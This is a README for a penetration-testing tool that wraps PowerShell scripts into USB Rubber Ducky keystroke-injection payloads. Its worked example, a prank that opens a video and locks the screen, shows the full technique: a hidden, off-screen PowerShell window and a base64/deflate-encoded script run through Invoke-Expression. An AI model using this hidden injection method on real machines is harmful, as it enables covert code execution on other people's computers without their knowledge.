# loaduck

PowerShell script bootstrapper for the Hak5 USB Rubber Ducky.

Written in PowerShell.

Targets Windows 7 and Windows 10, YMMV otherwise.

## How

PowerShell files can be dragged on to loaduck.ps1 to generate a .ps1.ducky.txt
file that can be used on the ducky.

Or you can use a command like:

    powershell .\loaduck.ps1 [ps1 filename]

This will generate:

    [ps1 filename].ducky.txt

The wrapper script zips your source PowerShell into a single line, then
injects it in an (almost) invisible payload that's fired from Win-R.

### Example

For example, given a (really annoying) PowerShell script of:

```powershell
For ($i=0; $i -le 2; $i++) {
    start https://www.youtube.com/watch?v=dQw4w9WgXcQ
}
rundll32.exe user32.dll,LockWorkStation
```
The script will be encoded into the following Ducky Script:

```
DELAY 5000
GUI r
DELAY 250
ALT SPACE
STRING M
DOWN
REPEAT 40
ENTER
STRING powershell -w hidden iex '(Add-Type n -pas -m ''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex'
ENTER
DELAY 1000
STRING Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('c8svUtBQybQ1sFZQyVTQzUlVMAKxtLU1Faq5FICguCSxqEQho6SkoNhKX7+8vFyvMr+0pDQpVS85P1e/PLEkOcO+zDYlsNyk3DI8PSI5kKuWq6g0LyUnx9hIL7UiVaG0OLUIyAQK6PjkJ2eH5xdlB5cklmTm53HxcgEA')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
ENTER
```

The long PowerShell script creates the hidden PowerShell window that listens
for keystrokes (our minified annoying script in this case) and then runs them
when it receives and Enter key.

## Compression script

Borrowed from https://github.com/samratashok/nishang - that file remains GPL
licensed.

Small modifications have been made to reduce the final script size - see
https://github.com/thisismyrobot/loaduck/compare/4bd150a...master for those
changes.
